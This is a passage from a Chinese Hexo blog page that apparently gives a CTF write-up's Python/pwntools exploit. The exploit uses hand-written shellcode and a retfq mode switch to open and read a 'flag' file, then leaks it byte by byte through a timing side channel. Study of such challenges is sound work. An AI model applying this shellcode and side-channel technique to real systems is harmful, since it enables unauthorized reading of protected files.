rcx</span></span><br><span class="line"><span class="string">  xor byte ptr[rax+0x37],cl</span></span><br><span class="line"><span class="string">  push 0x47</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  sub byte ptr[rax+0x38],cl</span></span><br><span class="line"><span class="string">  push 0x48</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  sub byte ptr[rax+0x38],cl</span></span><br><span class="line"><span class="string">  push 0x23</span></span><br><span class="line"><span class="string">  push 0x40404040</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ebx ecx edx esi edi ebp</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* open(&quot;flag&quot;,0,0) */</span></span><br><span class="line"><span class="string">    mov esp,0x40404040</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ecx,eax</span></span><br><span class="line"><span class="string">    /* retfq */</span></span><br><span class="line"><span class="string">    push 0x33</span></span><br><span class="line"><span class="string">    push 0x40404064</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">    /* read */</span></span><br><span class="line"><span class="string">    mov rdi,rcx</span></span><br><span class="line"><span class="string">    mov rsi,0x404040a0</span></span><br><span class="line"><span class="string">    mov rdx,0x30</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = shellcode_mmap + append + shellcode_read + append + shellcode_retfq + append</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag),<span class="number">0x30</span>):</span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        p = process(<span class="string">&quot;shellcode&quot;</span>)</span><br><span class="line">        shellcode_blast = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            mov al,[rsi + %d]</span></span><br><span class="line"><span class="string">            cmp al,%d</span></span><br><span class="line"><span class="string">            loop:</span></span><br><span class="line"><span class="string">            ja loop</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>%(i,mid)</span><br><span class="line">        p.send(asm(payload))</span><br><span class="line">        sleep(<span class="number">0.25</span>)</span><br><span class="line">        p.send(asm(shellcode + shellcode_blast))</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                p.recv(timeout = <span class="number">0.01</span>)</span><br><span class="line">                <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">0.5</span>:</span><br><span class="line">                    left = mid + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        p.close()</span><br><span class="line">    flag += <span class="built_in">chr</span>(left)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>一点小问题是这里的<code>time.time() - start_time</code>的比较时间不能太短，否则会错</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">65</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
